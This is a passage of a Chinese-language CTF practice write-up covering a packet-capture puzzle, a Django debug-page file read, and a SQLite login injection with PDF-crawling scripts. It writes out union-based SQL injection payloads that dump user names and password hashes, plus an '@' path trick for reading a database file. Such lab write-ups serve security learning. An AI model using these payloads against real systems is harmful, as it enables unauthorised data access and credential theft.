	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121183324891_hu2572763224693502925.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121183324891_hu17907317339946677618.png 1024w"
	loading="lazy"
	
		alt="image-20250121183324891"
	
	
		class="gallery-image" 
		data-flex-grow="184"
		data-flex-basis="443px"
	
></p>
<p>ç„¶åè§£å‹é‡Œé¢çš„å‹ç¼©åŒ…ï¼Œæ‰“å¼€éŸ³é¢‘æŸ¥çœ‹é¢‘è°±å›¾è·å¾—flag</p>
<h2 id="wire1misc">Wire1(misc)
</h2><p>å¯¼å‡ºhttpå¯¹è±¡ï¼Œæ˜¯sqlæ³¨å…¥çš„åŒ…ï¼ŒæŸ¥è¯¢æˆåŠŸå°±æ˜¯704ï¼Œä¸æˆåŠŸå°±æ˜¯720</p>
<p>æ ¹æ®å¤§å°æ’åº</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250121184609592.png"
	width="940"
	height="689"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250121184609592_hu17020338885927752994.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250121184609592_hu17448416472808042585.png 1024w"
	loading="lazy"
	
		alt="image-20250121184609592"
	
	
		class="gallery-image" 
		data-flex-grow="136"
		data-flex-basis="327px"
	
></p>
<p>å°†å¯¹åº”çš„asciiç è½¬ä¸ºå­—ç¬¦</p>
<h2 id="catweb">Cat(web)
</h2><p>ç”¨127.0.0.1æ‹¼æ¥å„ç§å‘½ä»¤éƒ½æ²¡ç”¨ï¼Œæ€€ç–‘è¢«è¿‡æ»¤äº†</p>
<p>ç”¨bpå¯¹fuzzå­—å…¸çˆ†ç ´</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122183551210.png"
	width="1919"
	height="968"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122183551210_hu1183795812831734907.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122183551210_hu6560238747001257150.png 1024w"
	loading="lazy"
	
		alt="image-20250122183551210"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="475px"
	
></p>
<p>ä¸Šé¢ä¸¤ä¸ªæœ‰è¶…é•¿å›æ˜¾</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122185638316.png"
	width="1596"
	height="774"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122185638316_hu11898284740000149204.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122185638316_hu9469126092054362816.png 1024w"
	loading="lazy"
	
		alt="image-20250122185638316"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="494px"
	
></p>
<p>htmlä»£ç ï¼Œå¤åˆ¶å‡ºæ¥æµè§ˆå™¨æ‰“å¼€</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190104345.png"
	width="1605"
	height="86"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190104345_hu4835998192367401547.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190104345_hu14043432356136970726.png 1024w"
	loading="lazy"
	
		alt="image-20250122190104345"
	
	
		class="gallery-image" 
		data-flex-grow="1866"
		data-flex-basis="4479px"
	
></p>
<p>djangoæŠ¥é”™ç•Œé¢æœ€ä¸‹é¢æœ‰è¿™ä¸ªtrue in your django settings file ï¼ŒæŸ¥çœ‹settings</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190336946.png"
	width="1814"
	height="869"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190336946_hu15123628349942452592.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190336946_hu10666147684123806128.png 1024w"
	loading="lazy"
	
		alt="image-20250122190336946"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="500px"
	
></p>
<p>æŸ¥çœ‹æ•°æ®åº“è·¯å¾„ï¼Œç›´æ¥æœç´¢database</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190458948.png"
	width="1850"
	height="923"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190458948_hu5751479121880105247.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190458948_hu6889823890465986258.png 1024w"
	loading="lazy"
	
		alt="image-20250122190458948"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>æ‰¾åˆ°è·¯å¾„</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190615727.png"
	width="620"
	height="241"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190615727_hu12106056538369744971.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190615727_hu17765066691262843433.png 1024w"
	loading="lazy"
	
		alt="image-20250122190615727"
	
	
		class="gallery-image" 
		data-flex-grow="257"
		data-flex-basis="617px"
	
></p>
<p>æ„æ€å°±æ˜¯åœ¨ç»å¯¹è·¯å¾„å‰åŠ @å¯ä»¥è¯»å–æ–‡ä»¶å†…å®¹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">@/opt/api/database.sqlite3
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŸ¥è¯¢åæœç´¢CTF</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190814243.png"
	width="699"
	height="140"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250122190814243_hu15632931947317867793.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250122190814243_hu16434935261020771764.png 1024w"
	loading="lazy"
	
		alt="image-20250122190814243"
	
	
		class="gallery-image" 
		data-flex-grow="499"
		data-flex-basis="1198px"
	
></p>
<p>å‡ºç°flag</p>
<h2 id="flatscience">FlatScience
</h2><p>ç‚¹é“¾æ¥æ²¡ä¸œè¥¿éƒ½æ˜¯è®ºæ–‡ï¼Œæ‰«ç›®å½•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163100170.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163100170_hu13942916939960795410.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123163100170_hu3257035148259456767.png 1024w"
	loading="lazy"
	
		alt="image-20250123163100170"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>å‘ç°robots.txt</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163129381.png"
	width="500"
	height="183"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123163129381_hu1858404508609769346.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123163129381_hu17632326688772476434.png 1024w"
	loading="lazy"
	
		alt="image-20250123163129381"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="655px"
	
></p>
<p>å°±æ˜¯ä¸Šé¢çš„phpæ–‡ä»¶</p>
<p>æœ‰ä¸¤ä¸ªè´¦æˆ·è¦æ±‚ç™»å…¥æ€€ç–‘æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°ä¸æ˜¯</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164200190.png"
	width="466"
	height="50"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164200190_hu3491402588525810985.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123164200190_hu11713136735781840167.png 1024w"
	loading="lazy"
	
		alt="image-20250123164200190"
	
	
		class="gallery-image" 
		data-flex-grow="932"
		data-flex-basis="2236px"
	
></p>
<p>è¿™é‡Œä¹Ÿè¯´ä¸ç”¨å°è¯•ç»•è¿‡ç™»å…¥ï¼Œæˆ‘ä»¬å›åˆ°login.php</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164339804.png"
	width="487"
	height="280"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123164339804_hu5368968540710467121.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123164339804_hu3802773934475831926.png 1024w"
	loading="lazy"
	
		alt="image-20250123164339804"
	
	
		class="gallery-image" 
		data-flex-grow="173"
		data-flex-basis="417px"
	
></p>
<p>æºç æœ‰æç¤ºæˆ‘ä»¬æŸ¥çœ‹?debugç•Œé¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usr&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;usr&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$pass</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="s1">&#39;../fancy.db&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&#34;SELECT id,name from Users where name=&#39;&#34;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s2">&#34;&#39; and password=&#39;&#34;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&#34;Salz!&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;Some Error occourred!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">60</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: /&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;login.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸€æ®µphpä»£ç ,postè¦ä¼ usrå’Œpwï¼Œåé¢sqlæ³¨å…¥æŸ¥è¯¢ä¼šæŠŠpasswdè¿›è¡Œsha1åŠ å¯†ï¼Œè¿™é‡Œæ˜¯sqlite3æ•°æ®åº“</p>
<p>æœ‰ä¸€ä¸ªç‚¹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqliteæ•°æ®åº“æœ‰ä¸€å¼ sqlite_masterè¡¨ï¼Œ
</span></span><span class="line"><span class="cl">é‡Œé¢æœ‰type/name/tbl_name/rootpage/sqlè®°å½•ç€ç”¨æˆ·åˆ›å»ºè¡¨æ—¶çš„ç›¸å…³ä¿¡æ¯
</span></span></code></pre></td></tr></table>
</div>
</div><p>æµ‹è¯•äº†ä¸€ä¸‹æ˜¯usrå­˜åœ¨sqlæ³¨å…¥ï¼Œsqlmapå¼€æ‰«ï¼Œæ‰‹å·¥æ³¨å…¥å°±æ˜¯é—­åˆä¸º1&rsquo; ç„¶åè”åˆæ³¨å…¥å¾—ç»“æœ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; order by 3--+æŠ¥é”™</span>
</span></span><span class="line"><span class="cl"><span class="err">å°±æ˜¯</span><span class="mi">2</span><span class="err">å­—æ®µ</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select 1,2--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; uniom select name,sql from sqlite_master--+</span>
</span></span><span class="line"><span class="cl"><span class="err">æŸ¥è¯¢å‡ºç»“æœ</span>
</span></span><span class="line"><span class="cl"><span class="n">CREATE</span> <span class="n">TABLE</span> <span class="n">Users</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="n">id</span> <span class="ne">int</span> <span class="n">primary</span> <span class="n">key</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="n">name</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="n">hint</span> <span class="n">varchar</span><span class="p">(</span><span class="mi">255</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">æŸ¥çœ‹å››ä¸ªåˆ—è¡¨</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(id) from users--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(name) from users--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(password) from users--+</span>
</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; union select id,group_concat(hint) from users--+</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>sqlmapçˆ†æ•°æ®åº“åæ²¡ç»“æœï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä»–çš„æ•°æ®åº“åä¸ºsqlite_master</p>
<p>çˆ†å‡ºè¡¨åä¸ºUsers,ç›´æ¥dumpç»“æœ</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174514519.png"
	width="1133"
	height="246"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174514519_hu6493971393447445320.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123174514519_hu16947135524442753337.png 1024w"
	loading="lazy"
	
		alt="image-20250123174514519"
	
	
		class="gallery-image" 
		data-flex-grow="460"
		data-flex-basis="1105px"
	
></p>
<p>æ ¹æ®hintæˆ‘ä»¬çŒœæµ‹å’Œå¼€å¤´é‚£ä¸ªç•Œé¢çš„pdfè®ºæ–‡æœ‰å…³</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3çˆ¬å–å¤šç›®æ ‡ç½‘é¡µPDFæ–‡ä»¶å¹¶ä¸‹è½½åˆ°æŒ‡å®šç›®å½•</span><span class="err">ï¼š</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">re1</span> <span class="o">=</span> <span class="s1">&#39;[a-fA-F0-9]{32,32}.pdf&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">re2</span> <span class="o">=</span> <span class="s1">&#39;[0-9\/]{2,2}index.html&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pdf_list</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pdf</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">pdf_list</span> 
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="n">re_1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re1</span><span class="p">,</span><span class="n">req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">re_1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="n">i</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">pdf_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">re_2</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re2</span><span class="p">,</span><span class="n">req</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">re_2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_url</span> <span class="o">=</span> <span class="n">url</span><span class="o">+</span><span class="n">j</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">get_pdf</span><span class="p">(</span><span class="n">new_url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pdf_list</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># return re_2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pdf_list</span> <span class="o">=</span> <span class="n">get_pdf</span><span class="p">(</span><span class="s1">&#39;http://61.147.171.105:60837/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">pdf_list</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pdf_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;wget &#39;</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">StringIO</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfpage</span> <span class="kn">import</span> <span class="n">PDFPage</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">TextConverter</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.converter</span> <span class="kn">import</span> <span class="n">PDFPageAggregator</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.layout</span> <span class="kn">import</span> <span class="n">LTTextBoxHorizontal</span><span class="p">,</span> <span class="n">LAParams</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pdfminer.pdfinterp</span> <span class="kn">import</span> <span class="n">PDFResourceManager</span><span class="p">,</span> <span class="n">PDFPageInterpreter</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">importlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">Request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_pdf</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="p">)</span> <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;pdf&#34;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">convert_pdf_to_txt</span><span class="p">(</span><span class="n">path_to_file</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">rsrcmgr</span> <span class="o">=</span> <span class="n">PDFResourceManager</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">retstr</span> <span class="o">=</span> <span class="n">StringIO</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">codec</span> <span class="o">=</span> <span class="s1">&#39;utf-8&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">laparams</span> <span class="o">=</span> <span class="n">LAParams</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">device</span> <span class="o">=</span> <span class="n">TextConverter</span><span class="p">(</span><span class="n">rsrcmgr</span><span class="p">,</span> <span class="n">retstr</span><span class="p">,</span> <span class="n">codec</span><span class="o">=</span><span class="n">codec</span><span class="p">,</span> <span class="n">laparams</span><span class="o">=</span><span class="n">laparams</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path_to_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">interpreter</span> <span class="o">=</span> <span class="n">PDFPageInterpreter</span><span class="p">(</span><span class="n">rsrcmgr</span><span class="p">,</span> <span class="n">device</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">maxpages</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">caching</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">pagenos</span><span class="o">=</span><span class="nb">set</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
